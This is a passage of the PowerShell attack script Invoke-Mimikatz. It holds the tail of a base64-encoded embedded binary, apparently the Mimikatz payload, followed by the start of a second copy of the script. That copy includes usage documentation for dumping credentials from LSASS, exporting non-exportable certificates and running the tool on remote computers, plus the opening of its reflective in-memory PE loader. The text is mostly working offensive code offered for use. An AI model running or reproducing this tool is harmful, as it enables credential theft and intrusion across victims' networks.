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rCKwYrCisOKxIrFisaKx4rIismKyorLisyKzYrOis+KwIrRitKK04rUitWK1orXitiK2YraituK3Irdit6K34rQiuGK4orjiuSK5YrmiueK6IrpiuqK64rsiu2K7orviuCK8YryivOK9Ir1ivaK94r4ivmK+or7ivyK/Yr+iv+K8AAABwBAAwAQAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ij+KMIpBikKKQ4pEikWKRopHikiKSYpKikuKTIpNik6KT4pAilGKUopTilSKVYpWileKWIpZilqKW4pcil2KXopfilCKYYpiimOKZIplimaKZ4poimmKaoprimyKbYpuim+KYIpxinKKc4p0inWKdop3iniKeYp6inuKfIp9in6Kf4pwioGKgoqDioSKhYqGioeKiIqJioqKi4qMio2KjoqPioCKkYqSipAAAAgAQAZAEAADClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKygrLCswKzQrOCs8KwArRCtIK0wrUCtUK1grXCtgK2QraCtsK3ArdCt4K3wrQCuEK4grjCuQK5QrmCucK6ArpCuoK6wrsCu0K7grvCuAK8QryCvMK9Ar1CvYK9wr4CvkK+gr7CvwK/Qr+Cv8K8AAACQBAB4AAAAAKAQoCCgMKBAoFCgYKBwoICgkKCgoLCgwKDQoOCg8KAAoRChIKEwoUChUKFgoXChgKGQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiAKMQoyCjMKNAo1CjYKMAAACwBAAMAAAAeKiAqADABABQAQAAeKGIoZihqKG4ocih4KHooQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiAKMQoyCjMKNAo1CjYKNwo4CjkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWCpcKmAqZCpoKmwqcCp0KngqfCpAKoQqiCqMKpAqlCqYKpwqoCqiKqQqpiqoKqoqrCquKrAqsiq0KrYquCq6KrwqviqAKsIqxCrGKsgqyirMKs4q0CrSKtQq1irYKuAq4irkKuYq6CrqKuwq7ir8Kv4qwCsCKwQrBisIKworDisWKxwrIisoKzArMis4KzorPCs+KwgrWitgK2QrbCtwK0ArhCuIK4wrkiuWK5orniuqK64rsiu8K74rjCvUK9wr5CvqK+4r8iv6K8AAADQBAAMAAAACKAQoADgBAB0AAAA8KkAqiiqUKpgqnCqgKqQqqCq0KroqgirQKtgq4CrmKuoq7ir4KsArCCsQKxgrHisiKyorMis6KwArSCtMK1grXCtwK3QreCt8K0ArhCuQK5YrniuiK7IruCu8K74rjCvUK+Qr7Cv0K/wrwAAAPAEACgBAAAgoDCgQKBQoGCgcKCgoLCgwKDQoOCg8KAIoRihKKFIoXihoKHAoeChCKIYoiiiUKJwopCiyKLYovCiIKNAo1ijaKOIo7ijyKPYozCkQKRQpGCkiKSYpMCk+KQYpUilcKWIpbClyKUYpjCmQKZYpoCmmKa4ptCm8KYwp1CncKeQp6CnqKfQp+Cn+KcYqDCoSKhgqHiosKjQqPCoEKkwqVCpcKmgqbCpwKnQqeCp8KkIqhiqKKo4qliqeKq4quCq+Kogq0CrcKuAq7iryKvwqwCsEKw4rFCsWKyQrKCssKzArNCs4KzwrPisAK0IrRitOK1grYitsK3IrfCtCK4grkiuWK5oroiuqK7ArviuCK8grzivSK9wr5CvqK+4r8iv6K8AAAUAaAEAACCgOKBIoGigeKCIoMig+KAgoTihUKFooZChqKG4ocChyKHQodih6KEQoiCiMKJAolCiYKKIopiiqKLQouCi6KIIoyijYKNwo4CjkKOgo7Cj4KMQpDCkUKRwpIikqKTApNikAKUQpSClMKVApUilgKWgpbilyKXYpfilGKYoplCmaKaAppimyKb4piCnOKdQp2CnaKegp8Cn2Kfop/inIKg4qEioaKiIqKio4KjwqCCpMKloqXipkKmoqbip6Kn4qRCqKKo4qkiqcKqIqqCquKrQquiqAKsYq0CrWKuAq5irqKvQq+irEKwgrDCsQKxQrGCscKx4rICsiKywrPisEK0YrWitiK2graitsK24rcCtyK3Qrdit4K3orfCt+K0ArgiuEK4YriCuKK4wrjiuQK5IrlCuWK5grmiucK54roCuiK6QrqCusK7wrgCvEK8grzCvQK9wr5CvqK/Qr/CvAAAAEAUAjAAAACCgQKBwoICgsKDIoOigCKEwoUihWKGAoZihsKHIoSiiSKJgoniikKKoouCi8KIAoxCjOKNgo5ijqKMApBCkIKQwpECkUKRopHikiKSwpNCk8KQIpTClQKVQpWClcKWIpailyKXopSCmMKawrriu2K74rhivKK9Qr4CvoK/Qr+Cv8K8AAAAgBQAcAQAAAKAQoCCgQKBIoICgkKCgoLCg4KD4oAChIKEooUihaKGgocCh4KEgokCiWKJooniioKKwosCi0KLgogijIKNAo2ijqKPIoxCkMKRQpGikeKSopMCk2KT4pDClqKW4pcilCKYoplimaKaQprCmyKbYpuimEKcop1ingKeYp/inQKhQqGCocKiAqJCowKjgqACpGKkoqUipaKl4qaCpsKnAqcipAKogqlCqcKqYqriq8KoAqxCrIKswq0CrcKuIq5irqKu4qwCsCKworEisgKyQrKCssKzArNCs6Kz4rCCtUK14rZitsK3IreCt+K0QriiuUK54roiumK7Arsiu6K4QryivUK9wr4ivmK+or8iv4K/4rwAAADAFACABAAAwoGigeKCQoKCgsKDooBChKKFAoVihgKGQoaChsKHAodChAKIYojiiUKKwosCi0KLgoviiCKMYozijSKNYo3CjgKOoo8ij6KMIpCikOKRgpHCkgKSQpKCk4KTwpAClEKUgpTClYKV4pZilsKXIpeCl+KUQpiimQKZYpnCmiKagprim0KboplCneKeIp5in2KcAqBioMKhIqGCooKiwqMCo0KjgqPCoIKlAqVipeKmQqfCpAKoYqjCqOKpgqoCqoKq4qtiq+KoYqzirUKtwq4CrkKu4q+irGKw4rFisaKyIrKis0KzwrBCtKK04rWCtgK2wrdCt+K0QrlCuaK6Irqiu0K7YrgivGK9Yr3ivmK+4r8iv6K/4rwAAAEAFABQBAAA4oFigeKCIoJigqKDIoAChIKE4oWCheKGQoaih0KHwoRCiUKJYomCiqKL4ogijIKM4o2CjeKOQo6ijwKMopDikUKRwpHikqKS4pOCk8KQApRClGKVQpWClgKWQpaClyKX4pRimOKZIplimaKbApuCmAKcop0iniKegp9inGKgoqECoeKiIqKCo2KjoqACpMKk4qUCpiKnQqeCp8KkAqhCqQKpgqoiqoKrwqgCrEKsgqzirYKt4q5CrqKvAq9ir8KsIrBisKKxQrGisiKyorLis2Kz4rAitMK1ArVCtYK2IraCtyK3orQiuMK5IrmCueK6QrqiuyK7YruiuKK9Ar4CvkK+gr7CvwK/Qr+ivAFAFAEABAAAIoECgYKCAoKCguKDgoPigCKEYoSChQKFIoYChiKG4odCh8KEAojCiQKJQomCicKKAopiiqKK4osii8KIIoxijQKNgo4CjoKPAo+ijEKQopFikaKR4pJikwKTYpPikEKVQpXCloKXApdil+KUwplCmgKa4psim0KbwpvimKKc4p5CnsKfQpwCoEKggqDCoQKhQqIiomKjAqNio6Kj4qAipMKlIqWCpcKmIqaipEKqQqpiq2KroqgCrEKsgqzirSKtYq3irkKuoq+Cr6KsgrECsaKx4rIis4KwArSitOK2AraCtuK3Irdit6K34rRiuUK5grnCugK6QrqCuuK7grviuEK8YryCvKK8wrzivQK9Ir1ivaK9wr3ivgK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr9iv4K/or/Cv+K8AYAUADAMAAACgCKAYoCCgKKAwoDigQKBIoFCgWKBgoGigcKB4oICgiKCQoJigoKCooLCguKDAoMig0KDYoOCg6KDwoPigCKEQoSihMKE4oUChSKFQoVihYKFooXCheKGAoYihkKGYoaChqKGwobihwKHIodCh2KHgoeih8KH4oQiiEKIYoiCiKKIwojiiQKJIolCiWKJgomiicKJ4ooCiiKKoorCiyKLQotii4KLoovCi+KIwozijQKNIo1CjWKNgo2ijcKN4o4CjiKOQo5ijoKOoo7CjyKP4owCkGKQwpDikQKRIpFCkWKRgpGikcKR4pICkiKSQpJikoKSopLCkuKTApMik0KTYpOCk6KTwpPikAKUIpRClIKUopTClQKVIpWClaKWApYiloKWopbClwKXIpdCl4KXopfClAKYIpiCmKKZApkimYKZopoCmiKagpqimwKbIpuCm6KbwpgCnCKcQpyCnKKdAp0inYKdop3CneKeAp4inkKeYp6CnqKewp7inwKfIp9Cn2Kfgp+in8Kf4pwCoCKgQqBioIKgoqDCoOKhAqEioUKhYqGCoaKjAqMioAKkIqRCpGKkgqdip8Kn4qQCqCKoQqhiqIKooqjCqOKpAqkiqUKpYqmCqaKpwqniqgKqIqpCqoKqoqriqwKrIqvCq+KoAqwirEKsYqyCrKKtAq0irUKtYq2CraKtwq3irgKuIq5CrmKugq6irsKu4q8CryKvQq9ir4Kvoq/Cr+KsArAisEKwYrCCsMKw4rEisUKxgrGiseKyArJissKy4rMCsyKzQrNis4KzorPCs+KwArRitMK04rUCtSK1QrWitgK2IrZCtmK2graitsK24rcCtyK3Qrdit4K3orfCt+K0ArgiuEK4YriCuKK4wrkiuYK5ornCueK6AroiukK6YrqCuqK6wrriuwK7IrtCu2K7gruiu8K74rgCvCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr9iv4K/or/Cv+K8AcAUAbAEAAACgCKAQoBigIKAwoEigUKBYoGCgaKBwoHiggKCIoJCgmKCgoKigsKC4oMCgyKDQoNig4KDooAChGKEgoSihMKE4oVChaKFwoXihgKGIoZChmKGgobihwKHIodCh2KHgoeih8KH4oQCiCKIQohiiMKJQonCikKKYorCiuKLQotii8KIAowijEKMYozCjOKNQo2ijcKN4o4ijkKOYo6CjqKOwo7ijwKPIo9Cj2KPgo+ij8KP4owCkCKQQpBikIKQopDCkOKRApEikUKRYpGCkaKRwpHikgKSIpJCkmKSgpKiksKS4pMCkyKTQpNik4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeCl6KXwpfilAKYIphCmGKYgpiimMKY4pkCmSKZQplim+KeQq5iroKuoq7iryKvQq9ir4KvoqwAAABAHABAAAABIqWCpaKkAAABwBwCMAAAAOKB4oLCh+KEYojiiWKJ4oqiiwKLIotCiCKMQo2CjmKXAqMio0KjYqOCo6KjwqPioAKkIqRipIKkoqTCpOKlAqUipUKmwqriqwKrIqtCq2KroqkCrkKvgq2CscKywrMCsAK0QrVCtYK2grbCt8K0ArrCuwK4ArxCvUK9gr6CvsK/orwAAAIAHALQAAAAAoBCgSKBYoGiggKCQoNCg4KAgoTChaKF4oZiiqKLooviiOKNIo4ijmKPYo+ijKKQ4pHikiKTIpNikGKUopWileKW4pcilCKYYplimaKaoprim+KYIp0inWKeYp6in6Kf4pzioSKiIqJio2KjoqCipOKl4qYipyKnYqRiqKKpoqniquKrIqgirGKtYq2irqKu4q/irCKxIrFis0KzgrLCtAK5QrgCvUK+grwAAAJAHAIAAAAAQoCCgYKBwoLCgwKAAoRChsKHAoQCiEKJQomCioKKwovCiAKOAo9CjIKRwpNCk2KRApZCl4KUwpoCmAKdQp6Cn8KdAqJCo4KgwqYCp0KkgqnCqwKoQq3CriKvQqyCsoKzwrECtkK3grTCucK54roiu0K4gr3CvwK8AoAcAVAAAABCgYKDQoOigIKE4oYCh0KEgonCiwKIQo1CjWKNoo7Cj8KP4owikQKRIpFikoKTwpEClsKW4pcilEKZQplimaKawpgCnUKeQp5inqKcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='
    
    # SHA256 hash: c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae
    # https://www.virustotal.com/en/file/c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae/analysis/1450152913/

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
	}
}

Main
}function Invoke-Mimikatz
{
<#
.SYNOPSIS

This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
dump credentials without ever writing the mimikatz binary to disk. 
The script has a ComputerName parameter which allows it to be executed against multiple computers.

This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.

Function: Invoke-Mimikatz
Author: Joe Bialek, Twitter: @JosephBialek
Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: Mimikatz (included)
Optional Dependencies: None
Mimikatz version: 2.0 alpha (12/14/2015)

.DESCRIPTION

Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
functionality provided with Mimikatz.

.PARAMETER DumpCreds

Switch: Use mimikatz to dump credentials out of LSASS.

.PARAMETER DumpCerts

Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).

.PARAMETER Command

Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.
	
.EXAMPLE

Execute mimikatz on the local computer to dump certificates.
Invoke-Mimikatz -DumpCerts

.EXAMPLE

Execute mimikatz on two remote computers to dump credentials.
Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")

.EXAMPLE

Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"

.NOTES
This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Find mimikatz at: http://blog.gentilkiwi.com

.LINK

http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
#>

[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ComputerName,

    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $DumpCreds,

    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $DumpCerts,

    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
